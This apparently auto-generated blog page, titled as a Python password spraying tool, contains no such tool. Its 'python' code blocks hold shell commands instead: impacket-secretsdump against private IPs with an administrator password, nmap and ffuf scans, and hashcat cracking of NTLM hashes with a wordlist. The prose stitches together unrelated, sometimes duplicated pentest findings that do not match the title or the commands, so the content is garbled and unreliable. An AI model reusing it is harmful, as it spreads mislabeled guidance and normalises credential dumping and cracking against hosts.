---
TitleSEO: "Password Spraying Tool in Python | ZureFX"
TitlePost: "Password Spraying Tool — Python"
Author: "ZureFX"
Description: "A Python script for password spraying tool. Built for security research and automation."
Keywords: "python, parser, script, powershell, fuzzer"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-705.html"
URL_IMAGES: ""
Date: "2025-10-22"
Tags: "Python, Parser, Script, PowerShell, Fuzzer"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-705"
Permalink: "/scripting/script-password-spraying-tool-705.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `smbclient`
- `socat`
- `ldapsearch`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.14.141
nmap -sCV -p80,636,1521 10.41.70.11 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

```python
nmap -sCV -p22,110,5986 10.23.157.17 -oN scan.txt
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.24.61/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.152.138
feroxbuster -h
feroxbuster -h
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.38.175
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p1521,139,993 10.71.178.15 -oN scan.txt
feroxbuster -h
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 18.96s
```
